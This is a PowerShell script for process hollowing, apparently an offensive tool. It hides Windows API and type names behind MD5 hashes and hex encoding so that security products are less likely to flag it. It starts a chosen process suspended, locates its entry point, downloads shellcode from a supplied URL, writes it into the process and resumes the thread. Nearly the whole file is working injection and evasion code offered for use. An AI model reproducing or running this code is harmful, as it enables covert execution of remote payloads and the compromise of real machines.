<#
    Simple process hollowing powershell script that is making use of reflection, custom delegates and added obfuscation for potentially flagged strings. Obfuscation is trough simple MD5 hashes and Hex encoding for api names, methods and types
#>
$names_dict = @{
    "sys_name" = "a674ffdf2929b4677f3c47386f6b76bb"      ## System.dll
    "libs" = @{
        "k32" = "6b,65,72,6e,65,6c,33,32,2e,64,6c,6c"
        "nt" = "6e,74,64,6c,6c,2e,64,6c,6c"
    }
    "types" = @{
        "unsafe" = "f95e15be377a2ad69115238ebdaaf2eb"    ## Microsoft.Win32.UnsafeNativeMethods
        "native" = "9c1998077be57de794acb2cc817ea2c6"    ## Microsoft.Win32.NativeMethods
        "start_inf" = "7954136bca5e20bcb3924bae9cd769c2" ## Microsoft.Win32.NativeMethods+STARTUPINFO
        "proc_inf" = "b8204d05f2f6302a23f8d870b2470d25"  ## Microsoft.Win32.SafeNativeMethods+PROCESS_INFORMATION
    }
    "apis" = @{
        "get_hand" = "7bc58a7febfd74a1356e1b559bd25ca2"  ## GetModuleHandle
        "get_addr" = "65538bfa1e4f3a0b7edde70bcc4cbe76"  ## GetProcAddress
        "cproc" = "c6b59bdabc4d10b6cd98e97dbd071549"     ## CreateProcess
        "wpm" = "57,72,69,74,65,50,72,6f,63,65,73,73,4d,65,6d,6f,72,79"
        "rpm" = "52,65,61,64,50,72,6f,63,65,73,73,4d,65,6d,6f,72,79"
        "resume" = "52,65,73,75,6d,65,54,68,72,65,61,64"
        "query_proc" = "5a,77,51,75,65,72,79,49,6e,66,6f,72,6d,61,74,69,6f,6e,50,72,6f,63,65,73,73"
    }
}


$global:GMH = $null
$global:GPA = $null
$global:LLB = $null


function PrepareBase {
    $GPAs = @()
    [AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache } | ForEach { 
        $n = GetMd5 $_.Location.Split('\\')[-1]
        if ($n -eq $names_dict["sys_name"]) {
            $_.GetTypes() | ForEach {
                $n = GetMd5 $_.FullName
                if ($n -eq $names_dict["types"]["unsafe"]) {
                    $_.GetMethods() | ForEach {
                        $h = GetMd5 $_.Name
                        if ($h -eq $names_dict["apis"]["get_hand"]) {
                            $global:GMH = $_
                        } elseif ($h -eq $names_dict["apis"]["get_addr"]) {
                            $GPAs += $_
                        }
                    }
                }
            }
        } 
    }
    $global:GPA = $GPAs[0];
}



function GetMd5 {
    Param([string]$name)
    return (([System.Security.Cryptography.MD5]::Create()).ComputeHash([System.Text.Encoding]::UTF8.GetBytes($name)) | ForEach-Object { "{0:x2}" -f $_ }) -join ""
}


function GetType {
    Param([string]$type_name)

    [AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache } | ForEach {
        $n = GetMd5 $_.Location.Split('\\')[-1]
        if ($n -eq $names_dict["sys_name"]) {
            $_.GetTypes() | ForEach {
                $n = GetMd5 $_.FullName
                if ($n -eq $type_name) {
                    return $_
                }
            }
        }
    }
}


function ResolveAddr {
    Param([string]$lib_name, [string]$func_name)


    $libh = $GMH.Invoke($null, @($lib_name))
    try {
        $faddr = $global:GPA.Invoke($null, @($libh, $func_name))
        return $faddr
    } catch {
        $handleRef = New-Object System.Runtime.InteropServices.HandleRef -ArgumentList @($null, $libh)
        $faddr = $global:GPA.Invoke($null, @($handleRef, $func_name))
        return $faddr
    }
}


function PrepareAPI {
    Param(
      [IntPtr]$faddr,
      [Type]$ret_type,
      [Type[]]$arg_types
    )

    $asm = New-Object System.Reflection.AssemblyName('MyRefl')
    $domain = [AppDomain]::CurrentDomain
    $asm_build = $domain.DefineDynamicAssembly($asm, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
    $mod_build = $asm_build.DefineDynamicModule('MyMod', $false)
    $type_build = $mod_build.DefineType('MyDeleg', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
    $const_build = $type_build.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $arg_types)
    $const_build.SetImplementationFlags('Runtime, Managed')
    $method_build = $type_build.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ret_type, $arg_types)
    $method_build.SetImplementationFlags('Runtime, Managed')
    $dlg_type = $type_build.CreateType()
    $myFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($faddr, $dlg_type)
    return $myFunc
}


function Spawn {
    Param([string]$proc_to_spawn)

    $cproc = $null
    (GetType $names_dict["types"]["native"]).GetMethods() | ForEach {
        $n = GetMd5 $_.Name
        if ($n -eq $names_dict["apis"]["cproc"]) {
            $cproc = $_
        }
    }
    $startupInfoType = GetType $names_dict["types"]["start_inf"]
    $procInfoType = GetType $names_dict["types"]["proc_inf"]

    $startInfo = $startupInfoType.GetConstructors().Invoke($null)
    $procInfo = $procInfoType.GetConstructors().Invoke($null)
    $pName = [System.Text.StringBuilder]::new($proc_to_spawn)

    $cproc.Invoke($null, @($null, $pName, $null, $null, $false, 0x4, [IntPtr]::Zero, $null, $startInfo, $procInfo)) | Out-Null
    return $procInfo
}


function GetBaseAddr {
    Param([System.Object]$procInfo)


    $rpm = PrepareApi `
            (ResolveAddr `
                (($names_dict["libs"]["k32"] -split "," | ForEach-Object { [char][int]"0x$_" }) -join "") `
                (($names_dict["apis"]["rpm"] -split "," | ForEach-Object { [char][int]"0x$_" }) -join "")) `
                ([bool]) `
                @([IntPtr], [IntPtr], [Byte[]], [UInt32], [IntPtr])

    $qp = PrepareApi `
            (ResolveAddr `
                (($names_dict["libs"]["nt"] -split "," | ForEach-Object { [char][int]"0x$_" }) -join "") `
                (($names_dict["apis"]["query_proc"] -split "," | ForEach-Object { [char][int]"0x$_" }) -join "")) `
                ([UInt32]) `
                @([IntPtr], [Int32], [Byte[]], [UInt32], [UInt32])

    $procBaseInfo = [System.Byte[]]::CreateInstance([System.Byte], 48)
    $qp.Invoke($procInfo.hProcess, 0, $procBaseInfo, $procBaseInfo.Length, 0) | Out-Null

    $image_base_addr_peb = ([IntPtr]::new([BitConverter]::ToUInt64($procBaseInfo, 0x08) + 0x10))

    $read_buffer = [System.Byte[]]::CreateInstance([System.Byte], 0x200)
    $rpm.Invoke($procInfo.hProcess, $image_base_addr_peb, $read_buffer, 0x08, 0) | Out-Null

    $image_base_addr = [BitConverter]::ToInt64($read_buffer, 0)
    $image_base_ptr = [IntPtr]::new($image_base_addr)

    $rpm.Invoke($procInfo.hProcess, $image_base_ptr, $read_buffer, $read_buffer.Length, 0) | Out-Null
    $pe_offset = [BitConverter]::ToUInt32($read_buffer, 0x3c)
    $entry_rva = [BitConverter]::ToUInt32($read_buffer, $pe_offset + 0x28)
    $entry_addr = [IntPtr]::new($image_base_addr + $entry_rva)
    return $entry_addr
}


function WriteAndResume {
    Param(
        [IntPtr]$addr,
        [System.Object]$procInfo,
        [string]$sc_location
    )

    $wpm = PrepareApi `
            (ResolveAddr `
                (($names_dict["libs"]["k32"] -split "," | ForEach-Object { [char][int]"0x$_" }) -join "") `
                (($names_dict["apis"]["wpm"] -split "," | ForEach-Object { [char][int]"0x$_" }) -join "")) `
                ([bool]) `
                @([IntPtr], [IntPtr], [Byte[]], [UInt32], [IntPtr])

    $resume = PrepareApi `
            (ResolveAddr `
                (($names_dict["libs"]["k32"] -split "," | ForEach-Object { [char][int]"0x$_" }) -join "") `
                (($names_dict["apis"]["resume"] -split "," | ForEach-Object { [char][int]"0x$_" }) -join "")) `
                ([UInt32]) `
                @([IntPtr])

    $wc = New-Object System.Net.WebClient
    [Byte[]] $sc = $wc.DownloadData($sc_location)

    $wpm.Invoke($procInfo.hProcess, $addr, $sc, $sc.Length, [IntPtr]::Zero) | Out-Null
    $resume.Invoke($procInfo.hThread) | Out-Null
}


function Invoke-Hollow {

    [CmdletBinding()]
    param (
        [Parameter(Mandatory=$true)]
        [string]$Shellcode
        [string]$Process
    )

    PrepareBase
    $to_spawn = $Process
    $procInfo = Spawn $to_spawn
    [IntPtr]$addr = GetBaseAddr $procInfo
    WriteAndResume $addr $procInfo $Shellcode
    exit
}
